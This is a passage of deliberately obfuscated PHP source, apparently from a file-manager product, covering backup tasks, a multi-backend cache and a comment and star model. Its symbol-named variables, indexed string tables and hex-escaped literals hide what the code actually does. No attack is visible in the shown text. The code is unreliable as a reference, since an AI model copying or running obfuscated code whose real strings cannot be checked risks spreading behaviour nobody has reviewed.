$ß›™øÙ->end(); $–İñİàû = IO::getLastError($Ø ­‰èğ[891] . $›éù¸ã¸[$Ø ­‰èğ[87]] . $Ø ­‰èğ[892] . $ÚµæĞ‰ . $Ø ­‰èğ[178]); Backup::log($–İñİàû); return !1; } } $˜³”ƒÇ´ = new DbManage(); $øŞŸ¨£´ = $˜³”ƒÇ´->getSqlFile(); if (!$øŞŸ¨£´[$Ø ­‰èğ[893]] || !$øŞŸ¨£´[$Ø ­‰èğ[13]]) { Backup::log($Ø ­‰èğ[894]); return !1; } IO::move($øŞŸ¨£´[$Ø ­‰èğ[893]], $ÚµæĞ‰); IO::move($øŞŸ¨£´[$Ø ­‰èğ[13]], $ÚµæĞ‰); $ß›™øÙ->end(); $—ÌâúÄÏ = array($Ø ­‰èğ[895] => $Ùç°ÚäÀ, $Ø ­‰èğ[896] => time()); Backup::set($—ÌâúÄÏ); return !0; } private function backupPath($ìØô¡‹) { $Ô’ø† =& $_SERVER[ˆö¿ÚÌ¼]; $ ÛŞõÅ = $ìØô¡‹[$Ô’ø†[32]]; $ª¬•”¶ = Model($Ô’ø†[855])->get($Ô’ø†[856]); $éÃ­Ö¨ş = substr(md5($Ô’ø†[857] . $ª¬•”¶ . $ ÛŞõÅ), 0, 8); return "\x7b\151\157\x3a{$ìØô¡‹[$Ô’ø†[837]]}\x7d\x2f\144\141\164\x61\x62\x61\163\145\x2f\142\141\x63\153\x75\160\x2f" . $ ÛŞõÅ . $Ô’ø†[11] . $éÃ­Ö¨ş; } private function tmpFilesPath() { $¹ìé¼å™ =& $_SERVER[ˆö¿ÚÌ¼]; $¤ı¿ÊÌí = TEMP_FILES; if ($GLOBALS[$¹ìé¼å™[6]][$¹ìé¼å™[92]][$¹ìé¼å™[883]]) { $¤ı¿ÊÌí = $GLOBALS[$¹ìé¼å™[6]][$¹ìé¼å™[92]][$¹ìé¼å™[883]]; if (!mk_dir($¤ı¿ÊÌí) || !is_writable($¤ı¿ÊÌí) || !IO::mkfile($¤ı¿ÊÌí . $¹ìé¼å™[884])) { $¤ı¿ÊÌí = TEMP_FILES; } } return $¤ı¿ÊÌí; } } class BackupFile { public function __construct() { } public function index() { $›˜¯Õè‡ = Backup::get(); $†ÖØ†âñ = $›˜¯Õè‡[$_SERVER[ˆö¿ÚÌ¼][371]][$_SERVER[ˆö¿ÚÌ¼][233]][$_SERVER[ˆö¿ÚÌ¼][555]]; $ù…—½ö = array($_SERVER[ˆö¿ÚÌ¼][556] => array($_SERVER[ˆö¿ÚÌ¼][897], $†ÖØ†âñ), $_SERVER[ˆö¿ÚÌ¼][898] => array($_SERVER[ˆö¿ÚÌ¼][409], $›˜¯Õè‡[$_SERVER[ˆö¿ÚÌ¼][837]])); $‹à¯Úà¸ = (int) Model($_SERVER[ˆö¿ÚÌ¼][876])->where($ù…—½ö)->count($_SERVER[ˆö¿ÚÌ¼][555]); $Óõºê´ = (int) Model($_SERVER[ˆö¿ÚÌ¼][876])->where($ù…—½ö)->sum($_SERVER[ˆö¿ÚÌ¼][79]); $ÒêÕ…ğ = new TaskFileTransfer($_SERVER[ˆö¿ÚÌ¼][899], $_SERVER[ˆö¿ÚÌ¼][862], $‹à¯Úà¸, LNG($_SERVER[ˆö¿ÚÌ¼][871]) . $_SERVER[ˆö¿ÚÌ¼][872] . LNG($_SERVER[ˆö¿ÚÌ¼][900])); $ÒêÕ…ğ->task[$_SERVER[ˆö¿ÚÌ¼][848]] = $Óõºê´; $úèÎ±”µ = array($_SERVER[ˆö¿ÚÌ¼][901] => $‹à¯Úà¸, $_SERVER[ˆö¿ÚÌ¼][902] => $Óõºê´, $_SERVER[ˆö¿ÚÌ¼][903] => time()); Backup::set($úèÎ±”µ); $ºÉ³Ïß = !0; $í„Ì•€Õ = $this->storeIds(); $Õğ›ÄŠê = 1; $™“ûş”ë = 1000; $õéÃ™ùŞ = $Á¦ö½Ã = 0; $´Ò§Ì›‡ = array(); $ÒÓ¤•÷ = $¤•ù ˆ• = 0; do { $Ó º¡‡Á = $_SERVER[ˆö¿ÚÌ¼][904]; $Ë°¶úÕ = Model($_SERVER[ˆö¿ÚÌ¼][876])->where($ù…—½ö)->field($Ó º¡‡Á)->order($_SERVER[ˆö¿ÚÌ¼][905])->selectPage($™“ûş”ë, $Õğ›ÄŠê); $‚ÀãÔ’½ = !empty($Ë°¶úÕ[$_SERVER[ˆö¿ÚÌ¼][448]]) ? $Ë°¶úÕ[$_SERVER[ˆö¿ÚÌ¼][448]] : array(); foreach ($‚ÀãÔ’½ as $¾¤İëÅ) { if (!$this->_fileExist($¾¤İëÅ, $´Ò§Ì›‡, $í„Ì•€Õ)) { Backup::log($_SERVER[ˆö¿ÚÌ¼][906] . $¾¤İëÅ[$_SERVER[ˆö¿ÚÌ¼][555]] . $_SERVER[ˆö¿ÚÌ¼][907] . $¾¤İëÅ[$_SERVER[ˆö¿ÚÌ¼][87]]); continue; } $¸ë›«Šû = $¾¤İëÅ[$_SERVER[ˆö¿ÚÌ¼][87]]; $¶°¸À¶± = "\x7b\151\x6f\72{$›˜¯Õè‡[$_SERVER[ˆö¿ÚÌ¼][837]]}\x7d" . substr($¸ë›«Šû, strlen("\x7b\x69\x6f\x3a{$¾¤İëÅ[$_SERVER[ˆö¿ÚÌ¼][908]]}\175")); if (IO::exist($¶°¸À¶±)) { $ÒêÕ…ğ->updateFileEnd($¾¤İëÅ[$_SERVER[ˆö¿ÚÌ¼][32]], $¾¤İëÅ[$_SERVER[ˆö¿ÚÌ¼][79]]); } else { $¶°¸À¶± = get_path_father($¶°¸À¶±); IO::mkdir($¶°¸À¶±); if (!IO::copy($¸ë›«Šû, $¶°¸À¶±, $_SERVER[ˆö¿ÚÌ¼][909])) { Backup::log($_SERVER[ˆö¿ÚÌ¼][910] . $¸ë›«Šû . $_SERVER[ˆö¿ÚÌ¼][892] . $¶°¸À¶± . $_SERVER[ˆö¿ÚÌ¼][178]); $ºÉ³Ïß = !1; break; } } $†ÖØ†âñ = $¾¤İëÅ[$_SERVER[ˆö¿ÚÌ¼][555]]; $Á¦ö½Ã += 1; $õéÃ™ùŞ += $¾¤İëÅ[$_SERVER[ˆö¿ÚÌ¼][79]]; $¤•ù ˆ• += 1; $ÒÓ¤•÷ += $¾¤İëÅ[$_SERVER[ˆö¿ÚÌ¼][79]]; if ($õéÃ™ùŞ >= 1024 * 1024 * 100) { $úèÎ±”µ = array($_SERVER[ˆö¿ÚÌ¼][836] => $†ÖØ†âñ, $_SERVER[ˆö¿ÚÌ¼][911] => $¤•ù ˆ•, $_SERVER[ˆö¿ÚÌ¼][912] => $ÒÓ¤•÷); Backup::set($úèÎ±”µ); $õéÃ™ùŞ = $Á¦ö½Ã = 0; } } $ôïÅ§Ñ¨ = count($‚ÀãÔ’½); $Õğ›ÄŠê++; } while ($ôïÅ§Ñ¨ == $™“ûş”ë); $ÒêÕ…ğ->end(); $úèÎ±”µ = array($_SERVER[ˆö¿ÚÌ¼][913] => 1, $_SERVER[ˆö¿ÚÌ¼][846] => time(), $_SERVER[ˆö¿ÚÌ¼][860] => 1, $_SERVER[ˆö¿ÚÌ¼][836] => $†ÖØ†âñ, $_SERVER[ˆö¿ÚÌ¼][914] => time()); if ($Á¦ö½Ã) { $úèÎ±”µ[$_SERVER[ˆö¿ÚÌ¼][911]] = $¤•ù ˆ•; $úèÎ±”µ[$_SERVER[ˆö¿ÚÌ¼][912]] = $ÒÓ¤•÷; } Backup::set($úèÎ±”µ); return !0; } private function _fileExist($½Ş©ï«§, &$ú½Ş©Õ, $€ˆà´á°) { $÷¦¿õ²ê =& $_SERVER[ˆö¿ÚÌ¼]; $¡¹™Åˆ = $½Ş©ï«§[$÷¦¿õ²ê[87]]; if (in_array($½Ş©ï«§[$÷¦¿õ²ê[555]], $ú½Ş©Õ)) { return !1; } if (!in_array($½Ş©ï«§[$÷¦¿õ²ê[908]], $€ˆà´á°)) { return !1; } if (IO::exist($¡¹™Åˆ)) { return !0; } $õ¸İî¸Å = get_path_father($¡¹™Åˆ); if (IO::exist($õ¸İî¸Å)) { $ú½Ş©Õ[] = $½Ş©ï«§[$÷¦¿õ²ê[555]]; return !1; } $÷ƒêëò = array($÷¦¿õ²ê[908] => $½Ş©ï«§[$÷¦¿õ²ê[908]], $÷¦¿õ²ê[87] => array($÷¦¿õ²ê[462], "{$õ¸İî¸Å}\45")); $ü„Ï•ùÄ = Model($÷¦¿õ²ê[876])->where($÷ƒêëò)->field($÷¦¿õ²ê[556])->select(); $ú½Ş©Õ = array_merge($ú½Ş©Õ, array_to_keyvalue($ü„Ï•ùÄ, $÷¦¿õ²ê[12], $÷¦¿õ²ê[555])); return !1; } private function _fileFilter($á¾“¤ø) { $‹ÏÑŸ¨Ú =& $_SERVER[ˆö¿ÚÌ¼]; return; if (empty($á¾“¤ø)) { return; } $ğù‚ş³½ = array($‹ÏÑŸ¨Ú[555] => array($‹ÏÑŸ¨Ú[7], array_unique($á¾“¤ø))); $¥³µÏ˜ö = Model($‹ÏÑŸ¨Ú[915])->where($ğù‚ş³½)->field($‹ÏÑŸ¨Ú[194])->select(); foreach ($¥³µÏ˜ö as $ùÒÏÆ¹) { Model($‹ÏÑŸ¨Ú[915])->remove($ùÒÏÆ¹[$‹ÏÑŸ¨Ú[194]], !1); } } private function storeIds() { $úã†ú¨¦ =& $_SERVER[ˆö¿ÚÌ¼]; $–È²‘â = Model($úã†ú¨¦[852])->listData(); $ã¬½¢ºÙ = array(); $¸ê¯áÙº = $GLOBALS[$úã†ú¨¦[6]][$úã†ú¨¦[92]][$úã†ú¨¦[916]]; foreach ($–È²‘â as $óßÔã) { $Ğãˆõ¼ˆ = strtolower($óßÔã[$úã†ú¨¦[98]]); if (!isset($¸ê¯áÙº[$Ğãˆõ¼ˆ])) { continue; } $šñå¶˜Ÿ = $úã†ú¨¦[77] . (isset($¸ê¯áÙº[$Ğãˆõ¼ˆ]) ? $¸ê¯áÙº[$Ğãˆõ¼ˆ] : ucfirst($Ğãˆõ¼ˆ)); if (!class_exists($šñå¶˜Ÿ)) { continue; } $ã¬½¢ºÙ[] = $óßÔã[$úã†ú¨¦[478]]; } return $ã¬½¢ºÙ; } } class Cache { protected static $handle; protected static $memoryCache; public static function init() { $äô©¯ŠÔ =& $_SERVER[ˆö¿ÚÌ¼]; if (self::$handle) { return self::$handle; } self::$memoryCache = array(); $åÁ‰«å“ = $GLOBALS[$äô©¯ŠÔ[6]][$äô©¯ŠÔ[427]]; $ûúç£´ = $åÁ‰«å“[$åÁ‰«å“[$äô©¯ŠÔ[917]]]; $‚Ã¥¾ = $åÁ‰«å“[$äô©¯ŠÔ[918]]; switch ($åÁ‰«å“[$äô©¯ŠÔ[917]]) { case $äô©¯ŠÔ[21]: self::$handle = Model($äô©¯ŠÔ[919]); break; case $äô©¯ŠÔ[920]: self::$handle = new CacheRedis($ûúç£´, $‚Ã¥¾); break; case $äô©¯ŠÔ[921]: self::$handle = new CacheMemcached($ûúç£´, $‚Ã¥¾); break; case $äô©¯ŠÔ[233]: self::$handle = new CacheFile($ûúç£´, $‚Ã¥¾); break; default: break; } return self::$handle; } public static function initReset() { self::$handle = !1; self::$memoryCache = !1; } public static function key($¶ş¯Ùˆ) { if (is_array($¶ş¯Ùˆ) || is_object($¶ş¯Ùˆ)) { $¶ş¯Ùˆ = json_encode($¶ş¯Ùˆ); } $¶ş¯Ùˆ = rawurlencode($¶ş¯Ùˆ); return md5(KOD_SITE_ID . $_SERVER[ˆö¿ÚÌ¼][11] . $¶ş¯Ùˆ); } public static function get($º‡‡¾ı, $­¼Ùû»Ì = false) { $€ãğšÇ = self::key($º‡‡¾ı); $˜é›‡Ì¿ = self::init(); if ($­¼Ùû»Ì) { return unserialize($˜é›‡Ì¿->get($€ãğšÇ)); } if (!isset(self::$memoryCache[$€ãğšÇ])) { $ÆØĞ©îî = $˜é›‡Ì¿->get($€ãğšÇ); self::$memoryCache[$€ãğšÇ] = unserialize($ÆØĞ©îî); } return self::$memoryCache[$€ãğšÇ]; } public static function set($˜ßƒô¡, $çõÜŸ¹ö, $·ËŒ…‹ = false) { $ø×·’Ÿ­ =& $_SERVER[ˆö¿ÚÌ¼]; $òõèŸµë = self::key($˜ßƒô¡); if (isset(self::$memoryCache[$òõèŸµë]) && self::$memoryCache[$òõèŸµë] === $çõÜŸ¹ö) { return !0; } if ($·ËŒ…‹ === 0) { self::$memoryCache[$òõèŸµë] = $çõÜŸ¹ö; return !0; } $Êîş±Ò = self::init(); $Â‰¯Îîã = serialize($çõÜŸ¹ö); CacheLock::lock($˜ßƒô¡ . $ø×·’Ÿ­[922]); $Å¥¯û³ = $Êîş±Ò->set($òõèŸµë, $Â‰¯Îîã, $·ËŒ…‹); self::$memoryCache[$òõèŸµë] = $çõÜŸ¹ö; CacheLock::unlock($˜ßƒô¡ . $ø×·’Ÿ­[922]); return $Å¥¯û³; } public static function getCall($İŠĞØ, $…±¢åËÚ, $’µË©£, $®ĞıŠÛµ = array()) { $§Óß³é„ =& $_SERVER[ˆö¿ÚÌ¼]; $²„¯ş = self::get($İŠĞØ); if ($²„¯ş || $²„¯ş === $§Óß³é„[12]) { return $²„¯ş; } $²„¯ş = call_user_func_array($’µË©£, $®ĞıŠÛµ); $²„¯ş = $²„¯ş ? $²„¯ş : $§Óß³é„[12]; self::set($İŠĞØ, $²„¯ş, $…±¢åËÚ); return $²„¯ş; } public static function remove($˜„¶†áâ) { $Û®„åŞá = self::key($˜„¶†áâ); unset(self::$memoryCache[$Û®„åŞá]); self::clearTimeout(); CacheLock::lock($˜„¶†áâ); $Ã—§Şø = self::init()->remove($Û®„åŞá); CacheLock::unlock($˜„¶†áâ); return $Ã—§Şø; } public static function removeMemory($Õ€ïı“¢) { $Ùç†öš = self::key($Õ€ïı“¢); unset(self::$memoryCache[$Ùç†öš]); } public static function clearMemory($˜¤©Í¤² = false) { if ($˜¤©Í¤²) { $˜¤©Í¤² = self::key($˜¤©Í¤²); unset(self::$memoryCache[$˜¤©Í¤²]); return; } self::$memoryCache = null; self::$memoryCache = array(); } public static function deleteAll() { self::$memoryCache = array(); if (method_exists(self::init(), $_SERVER[ˆö¿ÚÌ¼][923])) { self::init()->deleteAll(); } } public static function clearTimeout() { if (method_exists(self::init(), $_SERVER[ˆö¿ÚÌ¼][924])) { self::init()->clearTimeout(); } } } goto fğÍºƒÕÒš; B–Ò‘·îÆ: class BackupModel extends ModelBaseLight { public $optionType = "\x53\x79\163\164\x65\x6d\56\142\141\143\153\165\160\114\151\163\164"; public $field = array("\x69\157", "\156\141\155\145", "\163\164\141\x74\165\163", "\x63\157\156\x74\x65\156\164", "\x6d\x61\x6e\x75\141\x6c", "\162\x65\x73\165\154\164", "\164\151\155\145\x46\x72\x6f\155", "\x74\151\x6d\x65\124\x6f"); public function config() { $öØ½òí… =& $_SERVER[ˆö¿ÚÌ¼]; Action($öØ½òí…[2011])->taskInit(); $¥šÇ²‘ = Model($öØ½òí…[855])->get($öØ½òí…[862]); $¥šÇ²‘ = json_decode($¥šÇ²‘, !0); $¥šÇ²‘ = is_array($¥šÇ²‘) ? $¥šÇ²‘ : array(); $this->parseContent($¥šÇ²‘); unset($¥šÇ²‘[$öØ½òí…[1754]]); Model($öØ½òí…[1753])->cacheClear(); $£¥æã‡• = $öØ½òí…[2012]; $²à¦Àï§ = Model($öØ½òí…[2013])->findByKey($öØ½òí…[1772], $£¥æã‡•); if (!$²à¦Àï§) { $²à¦Àï§ = array(); } if (isset($²à¦Àï§[$öØ½òí…[207]])) { $²à¦Àï§[$öØ½òí…[207]] = json_decode($²à¦Àï§[$öØ½òí…[207]], !0); } if (isset($¥šÇ²‘[$öØ½òí…[207]])) { $²à¦Àï§[$öØ½òí…[207]][$öØ½òí…[1757]] = $¥šÇ²‘[$öØ½òí…[207]]; unset($¥šÇ²‘[$öØ½òí…[207]]); } return array_merge($²à¦Àï§, $¥šÇ²‘); } public function listData($şŸªŸóá = false, $’¨°ùª× = "\x6d\157\144\151\146\171\124\x69\x6d\x65", $ÏÖŞÔ¿ê = false) { $¨‚‘ï­É = parent::listData($şŸªŸóá, $’¨°ùª×, !0); if (!$¨‚‘ï­É) { return $¨‚‘ï­É; } if ($şŸªŸóá) { $¨‚‘ï­É = array($¨‚‘ï­É); } foreach ($¨‚‘ï­É as &$‘àëÖŠÉ) { $this->parseContent($‘àëÖŠÉ); } return $şŸªŸóá ? $¨‚‘ï­É[0] : $¨‚‘ï­É; } public function parseContent(&$üÏĞÆîœ) { $ûµìú°š =& $_SERVER[ˆö¿ÚÌ¼]; $’º”¸Â = _get($üÏĞÆîœ, $ûµìú°š[171], $ûµìú°š[91]); if (!in_array($’º”¸Â, array($ûµìú°š[861], $ûµìú°š[1223]))) { $üÏĞÆîœ[$ûµìú°š[171]] = $’º”¸Â == $ûµìú°š[91] ? $ûµìú°š[1223] : $ûµìú°š[861]; } } public function lastItem() { $Â‰Ñ÷Ù = $this->listData(); return !empty($Â‰Ñ÷Ù[0]) ? $Â‰Ñ÷Ù[0] : null; } public function kill($ñâÁÊ†) { $™İ¹ûâÀ =& $_SERVER[ˆö¿ÚÌ¼]; $Î±½Ÿ†¥ = $this->listData($ñâÁÊ†); if (!$Î±½Ÿ†¥ || empty($Î±½Ÿ†¥[$™İ¹ûâÀ[32]])) { return !0; } Task::kill($™İ¹ûâÀ[870]); Task::kill($™İ¹ûâÀ[889]); Task::kill($™İ¹ûâÀ[899]); $‘Ú´àÂ¹ = $Î±½Ÿ†¥[$™İ¹ûâÀ[32]]; $Ú‹ŠÙ£¼ = TEMP_FILES . $™İ¹ûâÀ[865] . $‘Ú´àÂ¹ . $™İ¹ûâÀ[8]; IO::remove($Ú‹ŠÙ£¼, !1); return $this->remove($ñâÁÊ†); } public function remove($Ú¶–¾¦—) { $èÛ‚Íã = $this->listData($Ú¶–¾¦—); if (!$èÛ‚Íã) { return !0; } return $this->backupRemove($èÛ‚Íã); } private function backupRemove($¹¾ä¶ó¼) { parent::remove($¹¾ä¶ó¼[$_SERVER[ˆö¿ÚÌ¼][478]]); $Ã•‚ÈÍ = $this->backupPath($¹¾ä¶ó¼); IO::remove($Ã•‚ÈÍ, !1); return !0; } private function backupPath($áñ™“ğ¯) { $¨ˆ©óœË =& $_SERVER[ˆö¿ÚÌ¼]; $ÜåÃÕ‚ï = $áñ™“ğ¯[$¨ˆ©óœË[32]]; $ô¹µŞ»á = Model($¨ˆ©óœË[855])->get($¨ˆ©óœË[856]); $Òí„“…Ü = substr(md5($¨ˆ©óœË[857] . $ô¹µŞ»á . $ÜåÃÕ‚ï), 0, 8); return "\173\x69\x6f\72{$áñ™“ğ¯[$¨ˆ©óœË[837]]}\x7d\57\144\141\x74\x61\142\x61\x73\145\x2f\x62\x61\143\x6b\165\160\57" . $ÜåÃÕ‚ï . $¨ˆ©óœË[11] . $Òí„“…Ü; } public function start() { $‚¶íÚ¦í =& $_SERVER[ˆö¿ÚÌ¼]; if ($GLOBALS[$‚¶íÚ¦í[6]][$‚¶íÚ¦í[92]][$‚¶íÚ¦í[2014]] != $‚¶íÚ¦í[91]) { return !0; } $Ş˜Šª = $this->config(); if (!$Ş˜Šª || $Ş˜Šª[$‚¶íÚ¦í[1754]] != $‚¶íÚ¦í[91]) { return !1; } if ($Ş˜Šª[$‚¶íÚ¦í[171]] == $‚¶íÚ¦í[861]) { $Ó¾ÅŸô² = Model($‚¶íÚ¦í[855])->get($‚¶íÚ¦í[1338]); if ($Ó¾ÅŸô² == $‚¶íÚ¦í[1339]) { $Ş˜Šª[$‚¶íÚ¦í[171]] = $‚¶íÚ¦í[1223]; } } $Û¯¢‰Ø = $this->process(); foreach ($Û¯¢‰Ø as $ÇøàÔ”ó) { if ($ÇøàÔ”ó) { return Task::restart($ÇøàÔ”ó[$‚¶íÚ¦í[478]]); } } $ÉŞË‚¹ = new Backup(); $¿€—‘…™ = $ÉŞË‚¹->db(); if ($¿€—‘…™) { $¿€—‘…™ = $ÉŞË‚¹->dbFile(); if ($¿€—‘…™ && $Ş˜Šª[$‚¶íÚ¦í[171]] == $‚¶íÚ¦í[861]) { $¿€—‘…™ = $ÉŞË‚¹->file(); } } Backup::set(array($‚¶íÚ¦í[835] => 1, $‚¶íÚ¦í[846] => time())); return !0; } public function process() { $Ÿ§ö©ªï =& $_SERVER[ˆö¿ÚÌ¼]; $Š‡¦±ş = array($Ÿ§ö©ªï[842] => Task::get($Ÿ§ö©ªï[870]), $Ÿ§ö©ªï[847] => Task::get($Ÿ§ö©ªï[889]), $Ÿ§ö©ªï[233] => Task::get($Ÿ§ö©ªï[899])); $ıø•¤€Ç = !1; foreach ($Š‡¦±ş as &$‘ÓË¬) { if ($ıø•¤€Ç) { $‘ÓË¬ = !1; continue; } if ($‘ÓË¬) { $Õé–¦äÉ = intval(_get($‘ÓË¬, $Ÿ§ö©ªï[1790], 0)); if (time() - $Õé–¦äÉ > 7200) { Task::kill($‘ÓË¬[$Ÿ§ö©ªï[478]]); $ıø•¤€Ç = !0; $‘ÓË¬ = !1; } } } return $Š‡¦±ş; } public function restore() { $™›£´„› =& $_SERVER[ˆö¿ÚÌ¼]; ActionCall($™›£´„›[1151], !0, 1); ActionCall($™›£´„›[1151], !0, 0); } } class CommentModel extends ModelBase { protected $tableName = "\x63\157\x6d\155\x65\156\x74"; protected $tableMeta = array("\164\141\x62\x6c\145\x4e\x61\155\145" => "\143\x6f\x6d\x6d\145\x6e\x74\x5f\x6d\x65\x74\141", "\x6d\x65\164\x61\106\151\145\x6c\144" => "\143\157\x6d\x6d\x65\x6e\164\111\104"); const TYPE_SOURCE = 1; const TYPE_SHARE = 2; const TYPE_USER = 3; const TYPE_GROUP = 4; const TYPE_TOPIC = 5; const TYPE_STAR_OFFSET = 100000000; public static $TYPEALL = array(self::TYPE_SOURCE, self::TYPE_SHARE, self::TYPE_USER, self::TYPE_GROUP, self::TYPE_TOPIC); public function addComment($†êš–½Š) { $…ØÑñ®¤ =& $_SERVER[ˆö¿ÚÌ¼]; if ($†êš–½Š[$…ØÑñ®¤[2015]]) { $â˜ûú‡÷ = $this->where(array($…ØÑñ®¤[2016] => $†êš–½Š[$…ØÑñ®¤[2015]]))->find(); if (!$â˜ûú‡÷ || $â˜ûú‡÷[$…ØÑñ®¤[191]] != $†êš–½Š[$…ØÑñ®¤[191]] || $â˜ûú‡÷[$…ØÑñ®¤[583]] != $†êš–½Š[$…ØÑñ®¤[583]]) { return !1; } $this->where(array($…ØÑñ®¤[2016] => $†êš–½Š[$…ØÑñ®¤[2015]]))->setAdd($…ØÑñ®¤[2017], 1); } $†êš–½Š[$…ØÑñ®¤[2018]] = 0; $†êš–½Š[$…ØÑñ®¤[2017]] = 0; $†êš–½Š[$…ØÑñ®¤[835]] = 1; return $this->add($†êš–½Š); } public function commentCount($Š¡Ÿ¯À , $ÅÛ¥ÌÄ€, $Ş‰·ÑıË = false) { $­ï™š =& $_SERVER[ˆö¿ÚÌ¼]; if (!$Š¡Ÿ¯À ) { return array(); } if (is_string($Š¡Ÿ¯À ) || is_int($Š¡Ÿ¯À )) { $Š¡Ÿ¯À  = array($Š¡Ÿ¯À ); } $ÌÑù™Î¹ = array($­ï™š[583], $­ï™š[2019] => $­ï™š[579]); $ïßéæ¤Ï = array($­ï™š[583] => array($­ï™š[7], $Š¡Ÿ¯À ), $­ï™š[191] => $ÅÛ¥ÌÄ€); if ($Ş‰·ÑıË) { $ïßéæ¤Ï[$­ï™š[1785]] = $Ş‰·ÑıË; } $ëìç§³ñ = $this->field($ÌÑù™Î¹)->where($ïßéæ¤Ï)->group($­ï™š[583])->select(); return array_to_keyvalue($ëìç§³ñ, $­ï™š[583], $­ï™š[579]); } public function starTarget($ïï«Ù²º, $ÆÙÛ¿Ø ) { $ÈÛ«õİê =& $_SERVER[ˆö¿ÚÌ¼]; $ÖÄ«ó•Ì = $ïï«Ù²º + self::TYPE_STAR_OFFSET; $·®ÔÈÒ¸ = array($ÈÛ«õİê[1785] => USER_ID, $ÈÛ«õİê[191] => $ÖÄ«ó•Ì, $ÈÛ«õİê[583] => $ÆÙÛ¿Ø ); $ØŠ¹˜ò¸ = $this->where($·®ÔÈÒ¸)->find(); if ($ØŠ¹˜ò¸) { return $this->where(array($ÈÛ«õİê[478] => $ØŠ¹˜ò¸[$ÈÛ«õİê[478]]))->delete(); } $´ßÔÀ‰˜ = array($ÈÛ«õİê[2015] => 0, $ÈÛ«õİê[1785] => USER_ID, $ÈÛ«õİê[835] => 1, $ÈÛ«õİê[171] => $ÈÛ«õİê[12], $ÈÛ«õİê[191] => $ÖÄ«ó•Ì, $ÈÛ«õİê[583] => $ÆÙÛ¿Ø , $ÈÛ«õİê[2018] => 0, $ÈÛ«õİê[2017] => 0); return $this->add($´ßÔÀ‰˜); } public function starTargetCount($éÂâ²Ş, $¸×ˆóİ) { $ØÇ¿¤¿ =& $_SERVER[ˆö¿ÚÌ¼]; $‰³çÆé = $¸×ˆóİ + self::TYPE_STAR_OFFSET; $’ºñ©ıŞ = $this->commentCount($éÂâ²Ş, $‰³çÆé); $‡ÈäïÊ® = $this->commentCount($éÂâ²Ş, $‰³çÆé, USER_ID); return array($ØÇ¿¤¿[2020] => $’ºñ©ıŞ, $ØÇ¿¤¿[2021] => $‡ÈäïÊ®); } public function starTargetUserList($¾×é ìŒ, $Ã¸ô‚ı) { $‘¨µ‰ğ´ =& $_SERVER[ˆö¿ÚÌ¼]; $°±¾º±¥ = $¾×é ìŒ + self::TYPE_STAR_OFFSET; $šÂŒé‚ = array($‘¨µ‰ğ´[583] => $Ã¸ô‚ı, $‘¨µ‰ğ´[191] => $°±¾º±¥); $“Š È¤¹ = $this->where($šÂŒé‚)->count(); $ˆ§šåâ“ = array($‘¨µ‰ğ´[335] => $“Š È¤¹, $‘¨µ‰ğ´[2022] => array()); if (!$“Š È¤¹) { return $ˆ§šåâ“; } $ãìÔÀŒ· = $this->field($‘¨µ‰ğ´[1785])->where($šÂŒé‚)->limit(500)->select(); $ãìÔÀŒ· = array_to_keyvalue($ãìÔÀŒ·, $‘¨µ‰ğ´[12], $‘¨µ‰ğ´[1785]); $ˆ§šåâ“[$‘¨µ‰ğ´[2022]] = Model($‘¨µ‰ğ´[591])->userListInfo($ãìÔÀŒ·); return $ˆ§šåâ“; } public function prasiseUserList($Ô©äÚ÷½) { $ĞŠ¸Ì„¢ =& $_SERVER[ˆö¿ÚÌ¼]; $½áÖûè› = array($ĞŠ¸Ì„¢[2023] => $Ô©äÚ÷½); $òãõáÛÏ = $this->where($½áÖûè›)->find(); $äñ£‡÷Ğ = _get($òãõáÛÏ, $ĞŠ¸Ì„¢[2018], 0); $éÛ¤÷‘› = array($ĞŠ¸Ì„¢[335] => $äñ£‡÷Ğ, $ĞŠ¸Ì„¢[2022] => array()); if (!$äñ£‡÷Ğ) { return $éÛ¤÷‘›; } $áË´©»å = Model($ĞŠ¸Ì„¢[2024])->field($ĞŠ¸Ì„¢[1785])->where($½áÖûè›)->limit(500)->select(); $áË´©»å = array_to_keyvalue($áË´©»å, $ĞŠ¸Ì„¢[12], $ĞŠ¸Ì„¢[1785]); $éÛ¤÷‘›[$ĞŠ¸Ì„¢[2022]] = Model($ĞŠ¸Ì„¢[591])->userListInfo($áË´©»å); return $éÛ¤÷‘›; } public function remove($“”èíùô) { $³ø×şú´ =& $_SERVER[ˆö¿ÚÌ¼]; $Ò›ŠìÁ¿ = array($³ø×şú´[2016] => $“”èíùô); $Ì²ÏúÕ½ = $this->where($Ò›ŠìÁ¿)->find(); if ($Ì²ÏúÕ½[$³ø×şú´[2015]]) { $this->where(array($³ø×şú´[2016] => $Ì²ÏúÕ½[$³ø×şú´[2015]]))->setAdd($³ø×şú´[2017], -1); } return $this->where($Ò›ŠìÁ¿)->delete(); } public function edit($½¤å„°Ä, $÷õ“àà¬) { $–Ğ¥å =& $_SERVER[ˆö¿ÚÌ¼]; $¿™õµø = array($–Ğ¥å[2016] => $½¤å„°Ä); return $this->where($¿™õµø)->save(array($–Ğ¥å[2025] => $÷õ“àà¬)); } public function prasise($ˆÎñÁÁ) { $©æ¼Ú»Ã =& $_SERVER[ˆö¿ÚÌ¼]; $ÒçË™° = Model($©æ¼Ú»Ã[2026]); $åÜøêä¦ = array($©æ¼Ú»Ã[2016] => $ˆÎñÁÁ, $©æ¼Ú»Ã[1776] => USER_ID); $Îğ×Õ›‡ = $ÒçË™°->where($åÜøêä¦)->find(); if (!$Îğ×Õ›‡) { $ÒçË™°->add($åÜøêä¦); $‘Ã¦å = $this->where(array($©æ¼Ú»Ã[2016] => $ˆÎñÁÁ))->setAdd($©æ¼Ú»Ã[2018], 1); } else { $ÒçË™°->where($åÜøêä¦)->delete(); $‘Ã¦å = $this->where(array($©æ¼Ú»Ã[2016] => $ˆÎñÁÁ))->setAdd($©æ¼Ú»Ã[2018], -1); } return $‘Ã¦å; } public function targetInfo($İ³ïÆü, $ö¹÷†ƒ) { $ÍñÏÊ¾± =& $_SERVER[ˆö¿ÚÌ¼]; $¾ãŠ©•Ù = array($ÍñÏÊ¾±[665] => $İ³ïÆü, $ÍñÏÊ¾±[666] => $ö¹÷†ƒ); $ÛàÙ“’« = $this->where($¾ãŠ©•Ù)->count(); $âŞƒŠÒì = "\122\111\x47\110\x54\x20\x4a\x4f\111\116\x20{$this->tablePrefix}\143\157\155\155\145\x6e\164\x5f\x70\x72\141\151\163\x65\40\x73\x74\141\162\x20\x6f\156\x20\143\x6f\155\155\x65\156\164\56\143\x6f\x6d\x6d\145\x6e\164\111\104\40\75\40\x73\x74\141\162\56\x63\157\155\x6d\x65\x6e\x74\x49\x44"; $•áÛ·Ñ = 